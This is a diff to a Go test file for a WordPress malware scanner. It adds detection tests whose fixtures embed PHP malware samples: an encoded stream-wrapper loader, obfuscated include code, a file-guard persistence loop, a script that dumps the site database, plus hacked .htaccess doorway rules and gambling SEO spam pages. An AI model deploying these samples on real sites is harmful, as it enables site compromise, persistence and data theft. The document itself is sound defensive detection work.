@@ -2271,7 +2271,7 @@ func TestFleetPasswordGateTrimmed(t *testing.T) {
 		"if (is_logged_in()) {\r\n?>\r\n<html><body><p>panel {fixture}</p><?php echo '}'; // } ?>\r\n</body>\r\n</html>\r\n<?php\r\n}\r\n?>\r\n" +
 		"<!DOCTYPE html>\r\n<html><body><form method=\"post\"><input type=\"password\" name=\"password\"></form>\r\n<?php if (true): ?><p>x</p><?php endif; ?>\r\n</body>\r\n</html>"
 	originals := map[string]string{
-		"wp-content/plugins/redirection/modules/wordpress.php": "<?php\n/** Redirection module (inert fixture) */\ndefined( 'ABSPATH' ) || exit;\nfunction red_fixture() { return 1; }\n",
+		"wp-content/plugins/redirection/modules/wordpress.php":  "<?php\n/** Redirection module (inert fixture) */\ndefined( 'ABSPATH' ) || exit;\nfunction red_fixture() { return 1; }\n",
 		"wp-content/themes/jannah/amp-templates/header-bar.php": "<header id=\"top\" class=\"amp-wp-header\">\n\t<?php echo esc_html( get_bloginfo( 'name' ) ); ?>\n</header>\n",
 	}
 	s := newScanner(t)
@@ -2337,5 +2337,164 @@ func TestFleetRahasiaCompanions(t *testing.T) {
 			(d.Signature == "PHP.Injector.MassPrepend" || d.Signature == "PHP.Backdoor.OpenAdminLogin" || d.Signature == "PHP.Dropper.HaltCompilerLoader") {
 			t.Errorf("%s: %+v", name, d)
 		}
+	}
+}
+
+// Wave 2 (superfast, 2026-11-13/14; incident-wave2 and legalcok reports):
+// shapes the scanner missed, as inert fixtures, each next to what it must
+// leave alone.
+func TestFleetWave2Shapes(t *testing.T) {
+	s := newScanner(t)
+	for _, c := range []struct{ name, path, body, want string }{
+		{"decoded stream include", "/home2/u/public_html/wp-content/themes/x/iuwgopufpj46jFM.php",
+			"<?php\n/** Plugin Name: Fixture Guard */\nclass Frag { public $p = 0; static $buf = ''; function stream_open($a,$b,$c,&$d){return true;} function stream_read($n){$r=substr(self::$buf,$this->p,$n);$this->p+=strlen($r);return $r;} function stream_eof(){return $this->p>=strlen(self::$buf);} function stream_stat(){return array();} }\n" +
+				"class Boot { const SCHEME = 'fragx'; function run($blob) { Frag::$buf = gzinflate(base64_decode($blob)); if (!in_array(self::SCHEME, stream_get_wrappers(), true)) { stream_wrapper_register(self::SCHEME, 'Frag'); } @include self::SCHEME . '://fragment'; } }\n", "PHP.Loader.DecodedStreamInclude"},
+		{"mixed-case calls", "/home2/u/site/wp-admin/maint/.tmb/index.php",
+			"<?=@null;$_____ = \"78da\";\nfunction ____($a){ $t = tempnam(sys_get_temp_dir(), 'x'); $h = fOpEn($t, \"w+\"); fWrItE($h, \"\\x3C\\x3F\\x70\\x68\\x70\\n\" . $a); FcLoSe($h); iNcLuDe $t; rEtUrN get_defined_vars(); }\neXtRaCt(____($_____));\n", "PHP.Obfuscated.MixedCaseCalls"},
+		{"file guard loop", "/home2/u/site/l.php",
+			"<?php unlink(__FILE__); $p = __DIR__ . '/index.php'; $c = file_get_contents($p); $m = md5($c);\nwhile (true) { if (!file_exists($p) || md5(file_get_contents($p)) != $m) { @file_put_contents($p, $c); @touch($p, strtotime(\"-400 days\", time())); @chmod($p, 0444); } sleep(1); }\n", "PHP.Persistence.FileGuard"},
+		{"unicode goto", "/home2/u/site/index.php",
+			"<?php\ngoto スタート;\n関数群:\nfunction 문자열($番号) { static $れんけつ = null; static $かけら = array('a','b'); return $かけら[$番号]; }\ngoto 終わり;\nスタート:\n$値 = 문자열(0); $値2 = 문자열(1); $値3 = base64_decode($値 . $値2);\n$送信 = curl_init($値3); $結果 = curl_exec($送信); $出力 = $結果;\ngoto 関数群;\n終わり:\necho $出力;\n", "PHP.Obfuscated.UnicodeGoto"},
+		{"database dump", "/home2/u/wt_fm_1793080320656791786_plugin-utils.php",
+			"<?php\nif (isset($_GET['test'])) { echo 'ok'; exit; }\n$d = __DIR__; require_once $d . '/wp-load.php';\nglobal $wpdb; $data = array();\nforeach ($wpdb->get_col(\"SHOW TABLES LIKE '{$wpdb->prefix}%'\") as $tn) { $data[$tn] = $wpdb->get_results(\"SELECT * FROM `$tn`\", ARRAY_A); }\necho base64_encode(gzencode(json_encode($data), 6));\n", "PHP.Exfil.WPDatabaseDump"},
+	} {
+		d := s.checkContent(c.path, ".php", []byte(c.body))
+		if d == nil || d.Signature != c.want {
+			t.Errorf("%s: got %+v, want %s", c.name, d, c.want)
+		}
+	}
+	for name, body := range map[string]string{
+		"stream wrapper library": "<?php\nclass VfsWrapper { function stream_open($p,$m,$o,&$x){return true;} }\nstream_wrapper_register('vfs', 'VfsWrapper');\n$data = base64_decode($cfg);\nfile_put_contents('vfs://root/a.txt', $data);\n",
+		"normal case":            "<?php\n$h = fopen($f, 'w'); fwrite($h, $x); fclose($h); include $tpl; return $r; $x = Fopen($f); $y = FOPEN($g);\n",
+		"worker loop":            "<?php\nwhile (true) { $job = $queue->pop(); if ($job) { file_put_contents($log, $job, FILE_APPEND); } sleep(1); }\n",
+		"japanese strings":       "<?php\n// 日本語のコメント\n$message = 'こんにちは世界'; $title = '設定'; goto done; done: echo $message . $title;\n",
+		"backup with permission": "<?php\nrequire_once ABSPATH . 'wp-load.php';\nif (!current_user_can('manage_options')) { exit; }\nglobal $wpdb; foreach ($wpdb->get_col('SHOW TABLES') as $t) { $rows = $wpdb->get_results(\"SELECT * FROM `$t`\"); }\necho base64_encode(json_encode($rows));\n",
+	} {
+		if d := s.checkContent("/home2/u/public_html/tool.php", ".php", []byte(body)); d != nil {
+			switch d.Signature {
+			case "PHP.Loader.DecodedStreamInclude", "PHP.Obfuscated.MixedCaseCalls", "PHP.Persistence.FileGuard", "PHP.Obfuscated.UnicodeGoto", "PHP.Exfil.WPDatabaseDump":
+				t.Errorf("%s: %+v", name, d)
+			}
+		}
+	}
+}
+
+// The wave's place shapes need a WordPress install around them.
+func TestFleetWave2Places(t *testing.T) {
+	s := newScanner(t)
+	if _, err := s.Settings.Patch([]byte(`{"scanner":{"virus_action":"quarantine"}}`)); err != nil {
+		t.Fatal(err)
+	}
+	root := filepath.Join(t.TempDir(), "home2", "u", "public_html")
+	os.MkdirAll(filepath.Join(root, "wp-includes"), 0o755)
+	os.WriteFile(filepath.Join(root, "wp-config.php"), []byte("<?php // fixture"), 0o644)
+	slot := "<!DOCTYPE html><html><head><title>Bandar Toto Slot Gacor Malam Ini Maxwin Togel AGUSTOTO</title>" +
+		"<meta name=\"description\" content=\"Bandar Toto situs slot gacor togel judi online maxwin\"></head><body>" + strings.Repeat("<p>fixture</p>", 50) + "</body></html>"
+	write := func(rel, body string) string {
+		p := filepath.Join(root, rel)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		os.WriteFile(p, []byte(body), 0o644)
+		return p
+	}
+	check := func(p string) *Detection {
+		info, _ := os.Lstat(p)
+		d, _ := s.CheckFile(p, info, s.Settings.Get().Scanner)
+		return d
+	}
+	lsc := "# BEGIN LSCACHE\n<IfModule mod_rewrite.c>\nRewriteEngine on\n</IfModule>\n# END LSCACHE\n"
+	ht := write(".htaccess", lsc+"# BEGIN LP-JOOMLA-STATIC\n<IfModule mod_rewrite.c>\nRewriteEngine On\n  RewriteRule ^(.+\\.html)/+$ $1 [L]\n</IfModule>\n# END LP-JOOMLA-STATIC\n")
+	for p, want := range map[string]string{
+		ht: "Htaccess.Hacked.StaticDoorway",
+		write("wp-load.php", `<meta http-equiv="refresh" content="0; URL=https://tinyurl.example/abc" />`): "WP.Core.BootstrapReplaced",
+		write("index.php", slot):                                    "WP.Core.IndexReplaced",
+		write("product-category/mdma/index.html", slot):             "HTML.SEOSpam.StaticDoorway",
+		write("products/7850/index.php", "<?php echo 'x'; ?>"+slot): "HTML.SEOSpam.StaticDoorway",
+	} {
+		if d := check(p); d == nil || d.Signature != want {
+			t.Errorf("%s: got %+v, want %s", p, d, want)
+		}
+	}
+	// The hacked .htaccess is put back without the block and with
+	// WordPress's rules (the original stays in quarantine).
+	info, _ := os.Lstat(ht)
+	f, err := s.Record(0, "realtime", ht, info, Detection{CatVirus, "Htaccess.Hacked.StaticDoorway"})
+	if err != nil || f.Status != "cleaned" {
+		t.Fatalf("htaccess: %+v %v", f, err)
+	}
+	got, _ := os.ReadFile(ht)
+	if !strings.Contains(string(got), "# BEGIN WordPress") || !strings.Contains(string(got), "BEGIN LSCACHE") {
+		t.Errorf("htaccess after cleaning: %q", got)
+	}
+	// Left alone: the real files, a page cache, and a gambling site that is
+	// not a WordPress install's subfolder.
+	for _, p := range []string{
+		write("sub/.htaccess", "RewriteEngine On\nRewriteRule ^(.+\\.html)/+$ $1 [L]\n"), // not a WordPress root
+		write("wp-blog-header.php", "<?php\nrequire_once __DIR__ . '/wp-load.php';\n"),
+		write("wp-content/cache/page/index.html", slot),
+	} {
+		if d := check(p); d != nil {
+			t.Errorf("%s: %+v", p, d)
+		}
+	}
+	os.WriteFile(filepath.Join(root, "index.php"), []byte("<?php\ndefine( 'WP_USE_THEMES', true );\nrequire __DIR__ . '/wp-blog-header.php';\n"), 0o644)
+	if d := check(filepath.Join(root, "index.php")); d != nil {
+		t.Errorf("real index.php: %+v", d)
+	}
+	casino := filepath.Join(t.TempDir(), "home2", "v", "casino.example", "index.html")
+	os.MkdirAll(filepath.Dir(casino), 0o755)
+	os.WriteFile(casino, []byte(slot), 0o644)
+	if d := check(casino); d != nil && d.Signature == "HTML.SEOSpam.StaticDoorway" {
+		t.Errorf("a gambling site of its own: %+v", d)
+	}
+	sitehtml := write(".htaccess", lsc+"# BEGIN WordPress\nRewriteEngine On\nRewriteRule ^(.+\\.html)/+$ $1 [L]\nRewriteRule . /index.php [L]\n# END WordPress\n")
+	if d := check(sitehtml); d != nil {
+		t.Errorf("WordPress .htaccess with an .html rule: %+v", d)
+	}
+}
+
+// New rules reach files written before them without a full scan (owner,
+// 2026-11-14): a sweep of the files they are about, chosen from the
+// listing (names and places of every evidence set, files dated back).
+func TestHintSweep(t *testing.T) {
+	s := newScanner(t)
+	home := filepath.Join(t.TempDir(), "home2", "acct")
+	old := hintRoots
+	hintRoots = func() []string { return []string{home} }
+	t.Cleanup(func() { hintRoots = old })
+	put := func(rel, body string) string {
+		p := filepath.Join(home, rel)
+		os.MkdirAll(filepath.Dir(p), 0o755)
+		os.WriteFile(p, []byte(body), 0o644)
+		return p
+	}
+	dump := "<?php\n$d = __DIR__; require_once $d . '/wp-load.php';\nglobal $wpdb; foreach ($wpdb->get_col(\"SHOW TABLES\") as $tn) { $r[$tn] = $wpdb->get_results(\"SELECT * FROM `$tn`\"); }\necho base64_encode(json_encode($r));\n"
+	put("public_html/wt_fm_1793080320656791786_plugin-utils.php", dump) // by name
+	put("public_html/.tmb/zz.php", dump)                                // by place
+	hidden := put("public_html/wp-content/plugins/shop/includes/helper.php", dump)
+	past := time.Now().Add(-400 * 24 * time.Hour)
+	os.Chtimes(hidden, past, past) // dated back: found by its change time
+	plain := put("public_html/wp-content/plugins/shop/includes/other.php", dump)
+	os.Chtimes(plain, time.Now(), time.Now()) // not a candidate: the full scan's
+	put("public_html/wp-content/plugins/shop/index.php", "<?php // Silence is golden.")
+	// A target by name whose content is clean: opened, judged by its
+	// content, left alone (names only choose what is read).
+	put("public_html/data.php", "<?php\n// a site's own data endpoint\nheader('Content-Type: application/json');\necho json_encode(array('ok' => true));\n")
+	checked, found := s.HintSweep(context.Background())
+	if found != 3 {
+		t.Fatalf("checked %d, found %d, want 3", checked, found)
+	}
+	var n int
+	s.DB.QueryRow(`SELECT count(*) FROM findings WHERE path LIKE '%other.php'`).Scan(&n)
+	if n != 0 || checked != 4 {
+		t.Fatalf("checked %d files; other.php found %d times", checked, n)
+	}
+	s.DB.QueryRow(`SELECT count(*) FROM findings WHERE path LIKE '%/data.php'`).Scan(&n)
+	if n != 0 {
+		t.Fatal("a clean data.php was flagged for its name")
+	}
+	var kind, status string
+	s.DB.QueryRow(`SELECT kind, status FROM scans ORDER BY id DESC LIMIT 1`).Scan(&kind, &status)
+	if kind != "rules" || status != "completed" {
+		t.Fatalf("scan row: %s %s", kind, status)
 	}
 }
